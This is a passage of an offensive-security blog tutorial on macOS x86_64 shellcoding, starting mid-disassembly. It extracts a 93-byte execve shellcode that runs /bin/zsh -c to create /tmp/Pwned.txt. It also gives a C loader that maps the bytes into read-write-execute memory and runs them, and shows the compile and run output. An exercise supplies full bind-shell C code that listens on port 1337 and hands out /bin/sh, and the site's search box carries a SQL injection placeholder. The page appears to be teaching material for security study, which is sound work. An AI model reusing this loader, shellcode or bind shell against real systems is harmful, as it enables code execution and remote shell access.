&lt;array+0x61&gt;</span><br><span class="line">      36: 70 2f                        	jo	0x67 &lt;array+0x25&gt;</span><br><span class="line">      38: 50                           	push	rax</span><br><span class="line">      39: 77 6e                        	ja	0xa9 &lt;array+0x67&gt;</span><br><span class="line">      3b: 65 64 2e 74 78               	je	0xb8 &lt;array+0x76&gt;</span><br><span class="line">      40: 74 00                        	je	0x42 &lt;array&gt;</span><br><span class="line"></span><br><span class="line">0000000000000042 &lt;array&gt;:</span><br><span class="line">      42: 53                           	push	rbx</span><br><span class="line">      43: 57                           	push	rdi</span><br><span class="line">      44: 48 89 e6                     	mov	rsi, rsp</span><br><span class="line">      47: 48 31 d2                     	xor	rdx, rdx</span><br><span class="line">      4a: b8 3b 00 00 02               	mov	eax, 0x200003b</span><br><span class="line">      4f: 0f 05                        	syscall</span><br><span class="line">      51: b8 01 00 00 02               	mov	eax, 0x2000001</span><br><span class="line">      56: bf 00 00 00 00               	mov	edi, 0x0</span><br><span class="line">      5b: 0f 05                        	syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure></figure>
+
+<ul>
+<li>Here we can see our dissassembled code clearly and the array, etc. We need to save this into file</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">objdump --disassemble --x86-asm-syntax=intel ~/shellcoding/execute.o &gt; execute.disasm</span><br></pre></td></tr></table></figure></figure>
+
+<ul>
+<li>Now, Let’s extract the hex bytes from the <code>execute.disasm</code> file. Using command line utilities.</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding% grep -E <span class="string">&#x27;^[[:space:]]+[0-9a-f]+:&#x27;</span> execute.disasm \</span><br><span class="line">  | awk <span class="string">&#x27;&#123;for(i=2;i&lt;=NF;i++) if ($i ~ /^[0-9a-f]&#123;2&#125;$/) printf &quot;%s&quot;, $i&#125;&#x27;</span> \</span><br><span class="line">  | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> &gt; shellcode.hex</span><br><span class="line">shellcoding% <span class="built_in">cat</span> shellcode.hex </span><br><span class="line">4831c95148ba2f62696e2f7a7368524889e7bb2d630000534889e351e8210000006563686f2022573030745730307422203e202f746d702f50776e65642e7478740053574889e64831d2b83b0000020f05b801000002bf000000000f05</span><br></pre></td></tr></table></figure></figure>
+
+<ul>
+<li>Convert it to binary</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding% xxd -r -p shellcode.hex &gt; shellcode.bin</span><br></pre></td></tr></table></figure></figure>
+
+<ul>
+<li>Let’s Check the Shellcode size</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding% <span class="built_in">wc</span> -c shellcode.bin</span><br><span class="line">      93 shellcode.bin // 93 bytes</span><br></pre></td></tr></table></figure></figure>
+
+<ul>
+<li>Generate <code>C</code> array of bytes for the shellcode</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding% xxd -i shellcode.bin &gt; shellcode.h</span><br><span class="line">shellcoding% <span class="built_in">cat</span> shellcode.h</span><br><span class="line">unsigned char shellcode_bin[] = &#123;</span><br><span class="line">  0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,</span><br><span class="line">  0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,</span><br><span class="line">  0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,</span><br><span class="line">  0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,</span><br><span class="line">  0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,</span><br><span class="line">  0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,</span><br><span class="line">  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,</span><br><span class="line">  0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05</span><br><span class="line">&#125;;</span><br><span class="line">unsigned int shellcode_bin_len = 93;</span><br></pre></td></tr></table></figure></figure>
+
+<h2 id="otool"><a href="#otool" class="headerlink" title="otool"></a>otool</h2><ul>
+<li>Extract Raw Section Bytes</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding% otool -s __TEXT __text ~/shellcoding/execute.o \</span><br><span class="line">  | sed -n <span class="string">&#x27;3,$p&#x27;</span> \</span><br><span class="line">  | awk <span class="string">&#x27;&#123; for(i=2;i&lt;=NF;i++) printf &quot;%s&quot;,$i &#125; END&#123; print &quot;&quot; &#125;&#x27;</span> &gt; shellcode_otool.hex</span><br><span class="line">shellcoding% <span class="built_in">cat</span> shellcode_otool.hex </span><br><span class="line">4831c95148ba2f62696e2f7a7368524889e7bb2d630000534889e351e8210000006563686f2022573030745730307422203e202f746d702f50776e65642e7478740053574889e64831d2b83b0000020f05b801000002bf000000000f05</span><br></pre></td></tr></table></figure></figure>
+
+<ul>
+<li>Convert to binary <code>xxd</code></li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">shellcoding% xxd -r -p shellcode_otool.hex &gt; shellcode_otool.bin</span><br></pre></td></tr></table></figure></figure>
+
+<ul>
+<li>Check shellcode length</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">Shellcoding% <span class="built_in">wc</span> -c shellcode_otool.bin</span><br><span class="line">      93 shellcode_otool.bin</span><br></pre></td></tr></table></figure></figure>
+
+<ul>
+<li>Convert it to <code>C</code> array</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">Shellcoding% <span class="built_in">cat</span> shellcode_otool.h</span><br><span class="line">unsigned char shellcode_otool_bin[] = &#123;</span><br><span class="line">  0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,</span><br><span class="line">  0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,</span><br><span class="line">  0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,</span><br><span class="line">  0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,</span><br><span class="line">  0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,</span><br><span class="line">  0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,</span><br><span class="line">  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,</span><br><span class="line">  0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05</span><br><span class="line">&#125;;</span><br><span class="line">unsigned int shellcode_otool_bin_len = 93;</span><br></pre></td></tr></table></figure></figure>
+
+<h2 id="Test-Shellcode-with-Loader"><a href="#Test-Shellcode-with-Loader" class="headerlink" title="Test Shellcode with Loader"></a>Test Shellcode with Loader</h2><p>Now, let’s write a loader in <code>C</code> to try and execute our shellcode:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> code[] = &#123;</span><br><span class="line">      <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0xba</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x7a</span>,</span><br><span class="line">      <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x52</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0xbb</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>,</span><br><span class="line">      <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe3</span>, <span class="number">0x51</span>, <span class="number">0xe8</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x68</span>,</span><br><span class="line">      <span class="number">0x6f</span>, <span class="number">0x20</span>, <span class="number">0x22</span>, <span class="number">0x57</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x74</span>, <span class="number">0x57</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x74</span>, <span class="number">0x22</span>,</span><br><span class="line">      <span class="number">0x20</span>, <span class="number">0x3e</span>, <span class="number">0x20</span>, <span class="number">0x2f</span>, <span class="number">0x74</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x2f</span>, <span class="number">0x50</span>, <span class="number">0x77</span>, <span class="number">0x6e</span>, <span class="number">0x65</span>,</span><br><span class="line">      <span class="number">0x64</span>, <span class="number">0x2e</span>, <span class="number">0x74</span>, <span class="number">0x78</span>, <span class="number">0x74</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>,</span><br><span class="line">      <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xb8</span>, <span class="number">0x3b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">      <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0xbf</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">size_t</span> len = <span class="keyword">sizeof</span>(code);</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child: allocate RWX, copy shellcode and execute</span></span><br><span class="line">        <span class="type">void</span> *exec = mmap(<span class="literal">NULL</span>, len, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class="line">                          MAP_ANON|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (exec == MAP_FAILED) &#123;</span><br><span class="line">            perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">            _exit(<span class="number">127</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(exec, code, len);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// print from child so you can see it if child doesn&#x27;t get replaced</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[child %d] executing shellcode (%zu bytes)...\n&quot;</span>, getpid(), len);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> (*func)() = (<span class="type">int</span>(*)())exec;</span><br><span class="line">        <span class="type">int</span> r = func(); <span class="comment">// if shellcode calls execve, child will be replaced</span></span><br><span class="line">        <span class="comment">// If returned, report and exit child</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[child %d] shellcode returned %d\n&quot;</span>, getpid(), r);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        _exit(r &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent: wait for child and then check side-effect</span></span><br><span class="line">        <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[parent %d] spawned child %d, waiting...\n&quot;</span>, getpid(), pid);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;waitpid&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[parent] child exited with status %d\n&quot;</span>, WEXITSTATUS(status));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[parent] child killed by signal %d\n&quot;</span>, WTERMSIG(status));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[parent] child ended with status 0x%x\n&quot;</span>, status);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// small sleep to allow any async side-effects to settle</span></span><br><span class="line">        usleep(<span class="number">200000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *check_path = <span class="string">&quot;/tmp/Pwned.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (access(check_path, F_OK) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[parent] Success: &#x27;%s&#x27; exists.\n&quot;</span>, check_path);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[parent] Failure: &#x27;%s&#x27; not found (errno=%d: %s)\n&quot;</span>,</span><br><span class="line">                   check_path, errno, strerror(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></figure>
+
+<p>The loader’s job is simple: it stores raw machine-code bytes (the shellcode) in a C <code>unsigned char</code> array, allocates a memory region with execute permission, copies the bytes into that region, casts the region pointer to a function pointer, and then calls it. That direct transfer of control is what lets the program run arbitrary machine code in the address space of the process. Because the shellcode can call <code>execve</code>, <code>_exit</code>, crash, or otherwise change the process state, the loader must be written with the understanding that control might never return to the original C runtime after the call into the shellcode. In the original single-process loader, <code>unsigned char code[] = &#123; ... &#125;;</code> places the bytes in the program’s data segment; <code>size_t len = sizeof(code);</code> computes the number of bytes to map and copy. The program then calls <code>mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0)</code>. This requests an anonymous (no-file-back) memory mapping with read, write and execute permissions; <code>NULL</code> lets the kernel choose the address, <code>len</code> is the requested size, and <code>MAP_ANON|MAP_PRIVATE</code> means the mapping is private and not backed by a file. If <code>mmap</code> fails (returns <code>MAP_FAILED</code>) the loader prints the error and exits. After a successful mapping the loader uses <code>memcpy(exec, code, len)</code> to place the shellcode bytes into the mapped pages, then casts the <code>void *</code> returned by <code>mmap</code> to a function pointer (<code>int (*func)() = (int(*)())exec;</code>) and calls <code>func()</code>. Casting a data pointer to a code pointer and invoking it is implementation-defined in the C standard, but is the de‑facto technique used on <code>POSIX</code> systems for this purpose. What can happen when the call to <code>func()</code> executes depends entirely on what the shellcode does. If the shellcode is written to return cleanly it will restore registers and the stack appropriately and the loader continues execution after the call. If the shellcode invokes <code>execve()</code> successfully, the kernel replaces the entire process image with a new program, so none of the loader’s code after the call executes. If the shellcode calls <code>_exit()</code> or the process receives a fatal signal (segfault, illegal instruction), the process terminates and again no post-call statements run. Shellcode that corrupts the stack or registers without restoring them will also produce undefined behavior in the loader when control returns. In short: seeing only the pre-exec print usually means the shellcode either replaced or terminated the process or crashed it before your post-exec prints could run. A forked-loader variant is useful because it isolates the untrusted shellcode in a child process while the parent remains alive to observe results. When the program <code>fork()</code>, the child repeats the mapping, copy and invocation of the shellcode; any <code>execve</code> or <code>_exit</code> inside the child affects only the child. The parent calls <code>waitpid(child, &amp;status, 0)</code> to get the child’s exit status and can report whether the child exited normally, was killed by a signal, or returned a particular code. The parent can also check for side-effects such as files written by the child (for example <code>/tmp/Pwned.txt</code>) and print reliable diagnostics. This pattern is ideal for debugging shellcode that tends to replace or terminate its host process — the parent becomes the stable observer.</p>
+<ul>
+<li>Compile and Test the shellcode with the loader</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">zeyadazima.com% clang -o cloader cloader.c</span><br><span class="line">zeyadazima.com% ./cloader </span><br><span class="line">[parent <span class="number">29373</span>] spawned child <span class="number">29374</span>, waiting...</span><br><span class="line">[child <span class="number">29374</span>] executing <span class="title function_">shellcode</span> <span class="params">(<span class="number">93</span> bytes)</span>...</span><br><span class="line">[parent] child exited with status 0</span><br><span class="line">[parent] Success: &#x27;/tmp/Pwned.txt&#x27; exists.</span><br></pre></td></tr></table></figure></figure>
+
+<p>As we can see our shellcode executed successfully with no issues.</p>
+<h1 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h1><p>If you want to dive deeper more, you can do this exercise which is involving in creating a <code>BindShell</code> shellcode and execute it. </p>
+<p>Here all the things you need for the excersice:</p>
+<ul>
+<li>BindShell <code>C</code> code</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Source - https://stackoverflow.com/q</span></span><br><span class="line"><span class="comment">// Posted by gatorface, modified by community. See post &#x27;Timeline&#x27; for change history</span></span><br><span class="line"><span class="comment">// Retrieved 2025-11-10, License - CC BY-SA 3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Author:  Julien Ahrens (@MrTuxracer)</span></span><br><span class="line"><span class="comment">// Website:  http://www.rcesecurity.com </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// used for dup2 later</span></span><br><span class="line">    <span class="type">int</span> sockfd; <span class="comment">// socket file descriptor</span></span><br><span class="line">    <span class="type">int</span> clientfd; <span class="comment">// client file descriptor</span></span><br><span class="line">    <span class="type">socklen_t</span> socklen; <span class="comment">// socket-length for new connections</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srv_addr</span>;</span> <span class="comment">// server aka listen address</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cli_addr</span>;</span> <span class="comment">// client address</span></span><br><span class="line"></span><br><span class="line">    srv_addr.sin_family = AF_INET; <span class="comment">// server socket type address family = internet protocol address</span></span><br><span class="line">    srv_addr.sin_port = htons( <span class="number">1337</span> ); <span class="comment">// server port, converted to network byte order</span></span><br><span class="line">    srv_addr.sin_addr.s_addr = htonl (INADDR_ANY); <span class="comment">// listen on any address, converted to network byte order</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// create new TCP socket</span></span><br><span class="line">    sockfd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// bind socket</span></span><br><span class="line">    bind( sockfd, (<span class="keyword">struct</span> sockaddr *)&amp;srv_addr, <span class="keyword">sizeof</span>(srv_addr) );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// listen on socket</span></span><br><span class="line">    listen(sockfd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// accept new connections</span></span><br><span class="line">    socklen = <span class="keyword">sizeof</span>(cli_addr);</span><br><span class="line">    clientfd = accept(sockfd, (<span class="keyword">struct</span> sockaddr *)&amp;cli_addr, &amp;socklen );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; i++)</span><br><span class="line">        dup2(clientfd, i);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// magic</span></span><br><span class="line">    <span class="comment">// execve( &quot;/bin/sh&quot;, NULL, NULL );</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//UPDATE: fixed exec call, shell still not returned to</span></span><br><span class="line">    <span class="comment">// client connecting with execl or proper execve</span></span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, (<span class="type">char</span> *)<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></figure>
+
+<p>Tasks:</p>
+<ul>
+<li>Use <code>execve()</code> instead of <code>execl</code></li>
+<li>Collect the syscall for <code>socket</code>,<code>bind</code>,<code>listen</code>,<code>accept</code> and <code>dup2</code>. As you will use it to build your <code>BindShell</code>.</li>
+<li>Study the functions arguments and get it ready for the functions&#x2F;syscalls</li>
+<li>Make sure to go around with the <code>struct</code>, Cause it’s similler to the way we built arrays</li>
+<li>Make sure to use the kernel source code to hop-around to find a variable value, like the <code>#define AF_INET</code> for example and explore the source code to help you creating your shellcode.</li>
+</ul>
+<h2 id="Help"><a href="#Help" class="headerlink" title="Help ?"></a>Help ?</h2><p>If you got any questions or need help, You can contact me:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.linkedin.com/in/zer0verflow/">Linkedin</a></li>
+<li><a target="_blank" rel="noopener" href="https://x.com/AzimaZeyad">Twitter&#x2F;X</a></li>
+<li>Email: <a href="mailto:&#x63;&#111;&#110;&#116;&#97;&#x63;&#116;&#64;&#122;&#x65;&#121;&#97;&#100;&#x61;&#x7a;&#x69;&#109;&#x61;&#x2e;&#99;&#111;&#109;">contact@zeyadazima.com</a></li>
+<li>Discord: <code>.killer_1337</code> including <code>.</code></li>
+</ul>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>We explored the fundamentals of writing shellcode on <code>macOS</code> for the <code>x86_64</code> architecture. We set up a proper lab environment, understood the <code>XNU</code> kernel and its syscall classes, and clarified calling conventions and register usage crucial for crafting shellcode. By following a structured workflow—starting from <code>C</code> code, identifying syscalls, converting to assembly, and handling arguments—we successfully created shellcodes for printing text, terminating processes, and executing commands. Through these examples, we demonstrated practical techniques such as handling arguments on the stack, using position-independent code, and correctly invoking syscalls in the <code>BSD</code> subsystem of <code>macOS</code>. This foundation sets the stage for more advanced topics.</p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://codebrowser.dev/">https://codebrowser.dev/</a></li>
+<li><a target="_blank" rel="noopener" href="https://man.freebsd.org/">https://man.freebsd.org/</a></li>
+<li><a target="_blank" rel="noopener" href="https://pubs.opengroup.org/">https://pubs.opengroup.org</a></li>
+<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/">https://man7.org/linux/man-pages/</a></li>
+<li><a target="_blank" rel="noopener" href="https://opensource.apple.com/releases/">https://opensource.apple.com/releases/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/apple-oss-distributions/xnu">https://github.com/apple-oss-distributions/xnu</a></li>
+<li><a target="_blank" rel="noopener" href="https://xcodereleases.com/">https://xcodereleases.com</a></li>
+<li><a target="_blank" rel="noopener" href="https://newosxbook.com/">https://newosxbook.com</a></li>
+</ul>
+</div></article><section class="post-bottom-topic mt-6 pt-5 pb-4"><p class="has-text-weight-semibold is-family-serif">macOS Shellcoding in depth on x86_6</p><a class="button is-default mt-2 has-text-weight-semibold" href="#postTitle" rel="nofollow">Click back to the top</a></section></div></div><div id="footer"></div><div class="columns is-flex-desktop is-justify-content-center comment-container is-flex-direction-row-reverse mt-1 pt-3" id="commentContainer"><aside class="column is-4-tablet is-3-widescreen post-container"><main class="aside-card-container search-widget is-relative" id="searchContainer"><label for="searchInput"><div class="is-flex px-4" id="searchButton"><svg class="icon mr-1"><use xlink:href="#icon-search"></use></svg><input class="search-input is-flex-grow-1" id="searchInput" placeholder="' or 1=1--"></div></label><section class="search-content content" id="searchContent"></section></main><script>(function() {
+    var columnsEl = document.getElementById('columns')
+    var searchContainerEl = document.getElementById('searchContainer')
+    var searchInputEl = document.getElementById('searchInput')
+    var searchButtonEl = document.getElementById('searchButton')
+    var searchResultEl = document.getElementById('searchContent')
+    var commentEl = document.getElementById('commentContainer')
+
+    searchInputEl.onfocus = function() {
+        searchContainerEl.classList.add("focus-within")
+        columnsEl && columnsEl.classList.add("focus-within")
+        commentEl && commentEl.classList.add("focus-within")
+    }
+
+    searchInputEl.onblur = function(evt) {
+        if (!evt.srcElement.value.trim()) {
+            searchContainerEl.classList.remove("focus-within")
+            columnsEl && columnsEl.classList.remove("focus-within")
+            commentEl && commentEl.classList.remove("focus-within")
+        }
+    }
+
+    searchInputEl.oninput = function (evt) {
+        var searchValue = evt.srcElement.value
+        var haveSearchValue = Boolean(searchValue.trim())
+        if (!haveSearchValue) {
+            searchResultEl.style.maxHeight = 0
+            return
+        }
+
+
+        var searchResults = searching(searchValue)
+
+        if (searchResults.length > 0) {
+            renderSearchResults(searchResults, searchResultEl)
+        }
+    }
+
+    searchButtonEl.onclick = function () {
+        if (searchDatabase.length > 0) return;
+
+        fetch('/search.xml').then(res => res.text()).then(res => {
+            var domparser = new DOMParser
+            var doc = domparser.parseFromString(res, 'application/xml')
+            searchDatabase = doc.getElementsByTagName('search')[0].children
+        })
+    }
+})()</script><span id="beforeA"></span><span id="afterA"></span><script>(adsbygoogle = window.adsbygoogle || []).push({})</script></aside><section class="column comment-box" id="commentBox"></section></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Mastodon--><!-- Bluesky--><!-- Matrix--><!-- Twitter--><!-- Weibo--><!-- Telegram--><a title="Telegram" target="_blank" rel="noopener nofollow" href="https://t.me/RedTeamRecipes"><svg class="icon has-text-grey"><use xlink:href="#icon-telegram"></use></svg></a><!-- Email--><a title="E-mail" target="_blank" rel="noopener nofollow" href="mailto:contact@redteamrecipes.com"><svg class="icon has-text-grey"><use xlink:href="#icon-mail-fill"></use></svg></a><!-- Github--><a title="GitHub" target="_blank" rel="noopener nofollow" href="https://github.com/RedTeamRecipes"><svg class="icon has-text-grey"><use xlink:href="#icon-github-fill"></use></svg></a><!-- Ins--><!-- RSS--><a title="RSS" target="_blank" rel="noopener nofollow" href="/feed.atom"><svg class="icon has-text-grey"><use xlink:href="#icon-feed"></use></svg></a></section><p><span>Copyright ©</span><span> RedTeam Recipes. </span><span></span></p><div><span><p>Use these notes responsibly.</p></span></div></footer><script src="/js/common.js"></script><script>$posts.mounted()</script><script>var searchDatabase = []
+
+function renderSearchResults(results, searchResultEl) {
+    searchResultEl.innerHTML = null
+    var fragment = document.createDocumentFragment()
+
+    results.forEach(function (item) {
+        var link = document.createElement('a')
+        var title = document.createElement('h5')
+        var content = document.createElement('p')
+
+        title.className = 'mb-1'
+        title.innerText = item.title
+        content.innerHTML = item.content
+
+        link.href = item.link
+        link.appendChild(title)
+        link.appendChild(content)
+        link.className = 'p-4 is-block'
+
+        fragment.appendChild(link)
+    })
+
+    searchResultEl.appendChild(fragment)
+    searchResultEl.style.maxHeight = '550px'
+}
+
+function searching(inputText) {
+    var inputTexts = inputText.split(' ')
+    var searchResults = []
+    inputTexts.forEach(function (searchKey) {
+        var haveSearchValue = Boolean(searchKey.trim())
+        if (!haveSearchValue) return
+
+        var key = searchKey.toLowerCase()
+
+        for (var entry of searchDatabase) {
